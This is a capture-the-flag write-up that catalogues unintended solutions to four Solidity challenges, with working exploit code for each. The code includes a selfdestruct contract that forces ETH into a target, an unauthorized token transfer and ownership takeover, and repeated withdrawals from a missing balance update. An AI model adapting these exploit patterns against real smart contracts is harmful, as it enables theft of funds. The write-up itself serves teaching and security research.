# Overview of unintended exploit patterns

## Baraa42: sending ETH by self destruct

Reported by

- lucyoa
- plotchy
- RomiRand
- teryanarmen
- Thro77le
- ych18

Baraa42 his Setup.sol

```
    function isSolved() external view override returns (bool) {
        bool condition1 = address(casino).balance >
            casino.totalDeposits() +
                casino.totalPrize() +
                casino.totalJackpot();
        bool condition2 = address(casino).balance >
            casino.totalDeposits() +
                (casino.totalPrize() * 25) /
                100 +
                casino.totalJackpot();
        bool gameOn = casino.gameOn();

        return (gameOn && condition1) || (!gameOn && condition2);
    }
```

Function `isSolved` returns `true` if balance of casino is higher than sum of totalDeposits, totalPrice and totalJackpot (these values are 0 in the beginning). This can be easily exploited by triggering `selfdestruct` on own contract and sending funds to casino.

```
pragma solidity 0.7.3;


contract Pwn {
    function destroy(address target) external payable {
        selfdestruct(payable(target));
    }
}
```

Execute:

```
    const Pwn = await hre.ethers.getContractFactory("Pwn");
    const pwn = await Pwn.deploy();

    await pwn.destroy(casino.address, {value: hre.ethers.utils.parseEther("1")});
```

## 0xNazgul: solvable in unintended way

> No extra point rewarded, as the CTF was marked as unsolvable and by finding this extra vulernability an extra point is aready earned.

Reported by

- plotchy
- RomiRand
- teryanarmen

Intended path of having challenger be delegated 100 tokens and becoming owner is not necessary for the solution.

You can approve and transfer 0xNazgul's EOA-minted tokens and delegate them back to 0xNazgul's EOA.
This makes 0xNazgul have more numCheckpoints than the Setup contract, and you can transferOwnership and selfdestruct it from there to complete the challenge.

```
constructor(FloraToken _challenge, Setup _setup) payable {
        challenge = _challenge;
        setup = _setup;

        nazgul = address(0x9678408E1B126A985D61a0A6c99ae98AbF4c85B3); //Hardcoded as it is 0xNazgul's EOA that deployed on Goerli before fork
        setup.approveFor(nazgul, address(this), type(uint256).max);
        _challenge.transferFrom(nazgul, address(this), 100); //not sure if i want 100 tokens yet

    }
    function finalize() external {
        challenge.delegate(nazgul);
        challenge.transferOwnership(nazgul);
    }

```

## naps62: missing require on `write0` function

Reported by

- RomiRand

I bypassed quite a chunk of functions to solve this. I didn't deal with the bets mechanic (`ecrecover` etc.) at all. The `shiftLeft` function only operates on the 2nd+ byte. However this can be circumvented by prepending a 0x00-byte (which will not influence the uint generation later). Maybe this was meant to protect the contract.

Of course this could also be the intended way; It just seemed a bit odd to me that I didn't have to execute those parts of the challenge.

```javascript
// SPDX-License-Identifier: None
pragma solidity 0.7.2;

import './Setup.sol';

contract Exploit {
    constructor(BuiltByANoob challenge) {
        // target: 0010B57E6DA0

        // could wrap this in a nice loop if I've too much time
        challenge.write0();

        challenge.write255();
        challenge.setHalfByte(bytes1(0x01));
        challenge.shiftLeft(4);

        challenge.write255();
        challenge.setHalfByte(bytes1(0x0B));
        challenge.shiftLeft(4);
        challenge.setHalfByte(bytes1(0x05));

        challenge.write255();
        challenge.setHalfByte(bytes1(0x07));
        challenge.shiftLeft(4);
        challenge.setHalfByte(bytes1(0x0E));

        challenge.write255();
        challenge.setHalfByte(bytes1(0x06));
        challenge.shiftLeft(4);
        challenge.setHalfByte(bytes1(0x0D));

        challenge.write255();
        challenge.setHalfByte(bytes1(0x0A));
        challenge.shiftLeft(4);
    }
}
```

# band0x "BecomeMaster" Unintended vulnerability

Reported by

- Plotchy

Intended path is

```
challenge.allocate();
challenge.takeMasterRole();
challenge.collectAllocations();
```

However, there is an unintended path.
Inside `allocate()` an uninitialized `caller` var is used to set an array element inside `allocations[]`. Instead of being saved with the msg.sender address, it is saved to the 0x0 address.
Alongside this, there is no `allocations[]` balance update within `sendAllocation()`, so instead of using the `collectAllocations()` path, you can use `challenge.sendAllocation(payable(address(0x0)))` twice.

```
challenge.allocate{value: 0.001 ether}();
challenge.takeMasterRole();
challenge.sendAllocation(payable(address(0x0)));
challenge.sendAllocation(payable(address(0x0)));
```
